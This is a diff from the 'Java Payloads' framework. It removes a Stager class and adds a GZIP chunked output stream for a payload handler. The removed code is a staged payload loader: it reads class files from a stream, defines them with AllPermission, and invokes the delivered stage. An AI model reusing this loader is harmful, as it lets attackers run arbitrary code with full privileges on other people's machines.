@@ -1,7 +1,7 @@
 /*
  * Java Payloads.
  * 
- * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
+ * Copyright (c) 2012 Michael 'mihi' Schierl.
  * All rights reserved.
  * 
  * Redistribution and use in source and binary forms, with or without
@@ -32,49 +32,30 @@
  * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  */
 
-package javapayload.stager;
+package javapayload.handler.dynstager;
 
-import java.io.DataInputStream;
+import java.io.FilterOutputStream;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.OutputStream;
-import java.io.PrintStream;
-import java.net.URL;
-import java.security.AllPermission;
-import java.security.CodeSource;
-import java.security.Permissions;
-import java.security.ProtectionDomain;
-import java.security.cert.Certificate;
+import java.util.zip.GZIPOutputStream;
 
-public abstract class Stager extends ClassLoader {
+public class GZIPChunkOutputStream extends FilterOutputStream {
 
-	protected final void bootstrap(InputStream rawIn, OutputStream out, String[] parameters) {
-		try {
-			final DataInputStream in = new DataInputStream(rawIn);
-			Class clazz;
-			int length = in.readInt();
-			do {
-				final byte[] classfile = new byte[length];
-				in.readFully(classfile);
-				clazz = define(classfile);
-				length = in.readInt();
-			} while (length > 0);
-			final Object stage = clazz.newInstance();
-			clazz.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class }).invoke(stage, new Object[] { in, out, parameters });
-		} catch (final Throwable t) {
-			t.printStackTrace(new PrintStream(out, true));
-		}
-	}
-	
-	protected final Class define(byte[] classfile) throws IOException {
-		final Permissions permissions = new Permissions();
-		permissions.add(new AllPermission());
-		final ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
-		Class clazz = defineClass(null, classfile, 0, classfile.length, pd);
-		resolveClass(clazz);
-		return clazz;
+	private OutputStream origOut;
+
+	public GZIPChunkOutputStream(OutputStream out) throws IOException {
+		super(new GZIPOutputStream(out));
+		origOut = out;
 	}
 
-	public abstract void bootstrap(String[] parameters, boolean needWait) throws Exception;
-	public abstract void waitReady() throws InterruptedException;
+	public void write(byte[] b, int off, int len) throws IOException {
+		out.write(b, off, len);
+	}
+
+	public synchronized void flush() throws IOException {
+		super.flush();
+		((GZIPOutputStream) out).finish();
+		out.flush();
+		out = new GZIPOutputStream(origOut);
+	}
 }
